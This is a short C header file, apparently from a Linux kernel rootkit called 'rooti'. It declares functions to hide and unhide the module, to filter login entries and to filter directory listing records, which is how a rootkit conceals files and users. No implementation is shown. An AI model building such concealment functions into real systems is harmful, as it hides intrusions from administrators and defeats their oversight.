#ifndef _ROOTI_HIDE_H
#define _ROOTI_HIDE_H

extern bool rooti_hidden;

void rooti_hideme(void);
void rooti_showme(void);

int rooti_filter_login_entry(char *user_buf, size_t count, char *name);
size_t rooti_filter_dir_entry(struct linux_dirent64 *curr_record, struct linux_dirent64 *prev_record, size_t count);

#endif